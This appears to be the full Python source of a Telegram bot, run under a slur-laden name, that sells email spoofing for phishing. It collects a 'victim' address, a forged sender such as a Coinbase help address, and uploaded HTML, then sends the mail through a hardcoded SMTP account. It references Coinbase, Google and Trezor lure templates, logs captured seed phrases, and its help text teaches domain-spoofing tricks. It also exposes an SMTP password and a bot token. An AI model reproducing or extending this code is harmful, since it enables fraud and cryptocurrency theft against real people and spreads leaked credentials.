import logging
import sys
import json
import traceback
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ConversationHandler,
    ContextTypes,
)
import smtplib
import os
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
import logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.FileHandler("debug.log", mode='a', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)
sys.stdout.reconfigure(encoding="utf-8")


file_logger = logging.getLogger("file_logger")
file_logger.setLevel(logging.INFO)


file_handler = logging.FileHandler("bot_logs.log", mode="a", encoding="utf-8")
file_handler.setLevel(logging.INFO)


formatter = logging.Formatter("%(message)s")
file_handler.setFormatter(formatter)

file_logger.addHandler(file_handler)

email_count_file = "email_count.json"
log_file_path = "bot_logs.log"
file_handler = logging.FileHandler(log_file_path, mode="a", encoding="utf-8")

# SMTP server details
smtp_details = {
    'server': 'multihandsnw.co.uk',
    'port': 587,
    'username': 'knotting@multihandsnw.co.uk',
    'password': 'WonderArtistLong514$'
}


# Admin ID
ADMIN_ID = 7984584613

AMOUNT_TOKEN = 9 
CUSTOM_VICTIM_EMAIL, CUSTOM_SUBJECT, CUSTOM_SENDER_NAME, CUSTOM_DISPLAY_EMAIL, CUSTOM_HTML = range(5)
DISPLAY_NAME, RECIPIENTS, REPRESENTATIVE, CASE_ID, SEED_PHRASE, LINK, SPOOF_EMAIL = (
    range(7)
)

global_email_count = 0
user_email_counts = {}

HTML_TEMPLATE_PATH = "coinbase_template.html"
HTML_WALLET_TEMPLATE_PATH = "coinbase_wallet_template.html"
HTML_SECURE_TEMPLATE_PATH = "coinbase_secure_template.html"
HTML_GOOGLE_TEMPLATE_PATH = "google_template.html"
HTML_TREZOR_TEMPLATE_PATH = "trezor.html"
HTML_DELAY_TEMPLATE_PATH = "coinbase_transaction.html"



def load_email_counts():
    global global_email_count, user_email_counts
    if os.path.exists(email_count_file):
        with open(email_count_file, "r") as file:
            data = json.load(file)
            global_email_count = data.get("global_count", 0)
            user_email_counts = data.get("user_counts", {})
            # Ensure user_email_counts has unique keys
            user_email_counts = {str(k): v for k, v in user_email_counts.items()}
    else:
        global_email_count = 0
        user_email_counts = {}

def save_email_counts():
    with open(email_count_file, "w") as file:
        json.dump(
            {"global_count": global_email_count, "user_counts": user_email_counts}, file
        )


def log_email_details(update: Update, command_type: str, victim_email: str, extra_info: dict = None):
    """Logs email details for each command in the required format."""
    user = update.effective_user
    username = user.username if user.username else "Unknown"
    user_id = user.id
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")


    if command_type == "wallet_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Seed phrase: {extra_info['seed_phrase']} | {current_time}"

    elif command_type == "secure_coinbase":
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | Link: {extra_info['link']} | {current_time}"

    else:
        log_message = f"@{username} / {user_id} | {victim_email} | {command_type} | {current_time}"


    file_logger.info(log_message)

def increment_global_email_count(user_id):
    global global_email_count, user_email_counts
    global_email_count += 1
    user_id_str = str(user_id)
    user_email_counts[user_id_str] = user_email_counts.get(user_id_str, 0) + 1
    save_email_counts()

async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    donate_message = (
        "If you want to support the team behind this, you can donate to the following addresses:\n\n"
        
        "BTC: bc1qj8f5r29ksq3uq62eu6ycr9qt9sfz9hjkcvz00m\n"
        "ETH: 0x86FF30eF6fc3652345EEe0B01482a15FecE5DE00\n"
        "SOL: CmnkLiqxRh5cAMWLx3EewLn3Mpxw7KJbj7ox6hGPKX3p\n"
        "LTC: LNQpZvqp2BkaDoSviNMU7zATzNxxUyhvfP"
    )
    if update.message:
        await update.message.reply_text(donate_message)
    elif update.callback_query:
        await update.callback_query.message.reply_text(donate_message)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    start_message = (
        "Welcome to @NiggaSpoofer\n"
        "Support: @un0h4na or @AlyaHidesHerFeelingsInTypeScript\n\n"
        "This project is funded by donations!\n"
        "If you want me to eat and keep the SMTPs fresh, feel free to do /donate\n\n"
        "USE CUSTOM MAIL AND HTML FOR COINBASE\n"
        "[Dono Leaderboard]\n\n"
        "[1] Anonymous - 2.3$\n"
        "[2] Anonymous - 1$\n"
        "[3] Anonymous - 1$\n\n"
        "[Info]\n\n"
        f"• Mails sent: {global_email_count}\n"
        f"• Your mails sent: {user_email_counts.get(str(update.effective_user.id), 0)}\n"
    )

    keyboard = [
        [KeyboardButton("Spoofer")],
        [KeyboardButton("Donate")],
        [KeyboardButton("Account")],
        [KeyboardButton("Help")]
    ]


    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text(start_message, reply_markup=reply_markup)


async def back_to_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await start(update, context)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "Welcome to *Nigga Spoofer*\\! 🎭\n\n"
        "Please check @niggaspoofer for frequently asked questions\\. For custom spoofings, follow this protocol:\n\n"
        "1\\. *Directory Spoofing*:\n"
        "   Let's say you want to spoof `playboicarti\\.com`\\. For your email, you'll want it to end in one of the directories\\.\n"
        "   Example: Instead of `@playboicarti\\.com`, use `@playboicarti\\.com/tour`\\.\n\n"
        "2\\. *Admin Prefix*:\n"
        "   At the start of your email, add `admin`\\. Almost every website has an admin email\\.\n\n"
        "3\\. *Research*:\n"
        "   For example, `ice\\.gov` has an email `iceprivacy@ice\\.gov`\\. \\(Google: `\\(company you want to spoof\\) \\+ email` to find these\\.\\)\n"
        "   Then, just add a directory like `/help` and spoof `iceprivacy@ice\\.gov/help`\\.\n\n"
        "I won't explain the technicals here because it would suck\\! 😉 Happy spoofing\\! 🚀"
    )
    if update.message:
        await update.message.reply_text(help_text, parse_mode="MarkdownV2")
    elif update.callback_query:
        await update.callback_query.message.reply_text(help_text, parse_mode="MarkdownV2")


async def get_user_id(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if update.message:
        await update.message.reply_text(f"Your user ID is: {user_id}")
    elif update.callback_query:
        await update.callback_query.message.reply_text(f"Your user ID is: {user_id}")




async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:

    await update.message.reply_text("Email sending cancelled.")
    context.user_data.clear()
    return ConversationHandler.END

async def custom_mail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        logger.info("Custom mail conversation STARTED")
        await update.message.reply_text("Enter target email...")
        return CUSTOM_VICTIM_EMAIL
    except Exception as e:
        logger.error(f"Error in custom_mail: {e}", exc_info=True)
        return ConversationHandler.END

async def get_custom_victim_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    try:
        victim_email = update.message.text
        logger.info(f"Received victim email: {victim_email}")
        context.user_data["victim_email"] = victim_email
        await update.message.reply_text("Enter email SUBJECT:")
        return CUSTOM_SUBJECT
    except Exception as e:
        logger.error(f"Error in get_custom_victim_email: {e}", exc_info=True)
        await update.message.reply_text("⚠️ An error occurred. Restart with /start")
        return ConversationHandler.END

async def get_custom_subject(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the subject and asks for the sender name."""
    context.user_data["subject"] = update.message.text
    await update.message.reply_text("Enter the display name: (The name that will show up as the sender, for david@coinbase.com you could use David")
    return CUSTOM_SENDER_NAME

async def get_custom_sender_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the sender name and asks for the display email."""
    context.user_data["sender_name"] = update.message.text
    await update.message.reply_text("Enter the spoofed email (ex. help@coinbase):")
    return CUSTOM_DISPLAY_EMAIL

async def get_custom_display_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the display email and asks for the HTML file to send."""
    context.user_data["display_email"] = update.message.text
    await update.message.reply_text("Upload the HTML file: (you can currently only fetch images from hyperlinks (eg. src = https://wikimedia.com/yourimage) If your messages arent delivering make sure your .HTML isnt spammy.")
    return CUSTOM_HTML

async def get_custom_html(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the HTML file and sends the email."""
    if update.message.document:
        file = await update.message.document.get_file()
        html_content = await file.download_as_bytearray()


        context.user_data["html_content"] = html_content.decode("utf-8")


        victim_email = context.user_data["victim_email"]
        subject = context.user_data["subject"]
        sender_name = context.user_data["sender_name"]
        display_email = context.user_data["display_email"]
        html_body = context.user_data["html_content"]


        msg = MIMEMultipart("related")
        msg["Subject"] = subject
        msg["From"] = f"{sender_name} <{display_email}>"
        msg["To"] = victim_email
        msg.attach(MIMEText(html_body, "html", "utf-8"))

        try:
            send_email_through_smtp(
                sender_name,
                smtp_details["username"],
                subject,
                msg,
                victim_email,
                update.effective_user.id
            )
            await update.message.reply_text("Custom email sent successfully!")
        except Exception as e:
            await update.message.reply_text(f"Failed to send email: {str(e)}")


        context.user_data.clear()
        return ConversationHandler.END
    else:
        await update.message.reply_text("Please upload a valid HTML file.")
        return CUSTOM_HTML



# Add the new command handler for broadcasting messages
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    await update.message.reply_text("Enter the message to broadcast:")
    return BROADCAST_MESSAGE

async def get_broadcast_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    message = update.message.text
    user_ids = get_all_user_ids()

    for user_id in user_ids:
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
        except Exception as e:
            logging.error(f"Failed to send message to {user_id}: {str(e)}")

    await update.message.reply_text("Broadcast message sent.")
    return ConversationHandler.END

def get_all_user_ids():
    user_ids = set()
    with open(log_file_path, "r", encoding="utf-8") as file:
        for line in file:
            parts = line.split(" / ")
            if len(parts) > 1:
                user_id = parts[1].split(" | ")[0]
                user_ids.add(user_id)
    return user_ids


# Add the new conversation handler for broadcasting messages
BROADCAST_MESSAGE = range(1)

broadcast_handler = ConversationHandler(
    entry_points=[CommandHandler("broadcast", broadcast)],
    states={
        BROADCAST_MESSAGE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_broadcast_message)],
    },
    fallbacks=[CommandHandler("cancel", cancel)],
)




def send_email_through_smtp(display_name, smtp_username, subject, msg, recipients, user_id):
    try:
        recipient_list = (
            recipients.split(",") if isinstance(recipients, str) else recipients
        )

        with smtplib.SMTP(smtp_details["server"], smtp_details["port"]) as server:
            server.starttls()
            server.login(smtp_username, smtp_details["password"])

            server.sendmail(smtp_username, recipient_list, msg.as_string())

        logging.info(f"{display_name} email sent successfully to {recipients}")

        # Increment the global and user email count
        increment_global_email_count(user_id)

    except Exception as e:
        logging.error(f"Failed to send email: {str(e)}")
        raise e




async def account_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    account_message = (
        f"Account Information:\n\n"
        f"User ID: {user_id}\n"
        f"Mails sent: {user_email_counts.get(str(user_id), 0)}"
    )
    await update.message.reply_text(account_message)









def main():
    load_email_counts()


    TOKEN = "8161193786:AAE90BUkRbyJBe4LjX-kKOQp80A1zGpeh48"
    application = ApplicationBuilder().token(TOKEN).build()
    custom_mail_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex(r'^Spoofer$'), custom_mail)],
        states={
            CUSTOM_VICTIM_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_victim_email)
            ],
            CUSTOM_SUBJECT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_subject)
            ],
            CUSTOM_SENDER_NAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_sender_name)
            ],
            CUSTOM_DISPLAY_EMAIL: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_custom_display_email)
            ],
            CUSTOM_HTML: [
                MessageHandler(filters.Document.ALL & ~filters.COMMAND, get_custom_html)
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    # Add the custom_mail_handler first to prioritize conversation states
    application.add_handler(custom_mail_handler)
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("donate", donate))
    application.add_handler(CommandHandler("id", get_user_id))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Donate)$"), donate))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Account)$"), account_info))
    application.add_handler(broadcast_handler)
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex("^(Help)$"), help_command))
    application.add_handler(CommandHandler("cancel", cancel))

    application.run_polling()

if __name__ == "__main__":
    main()


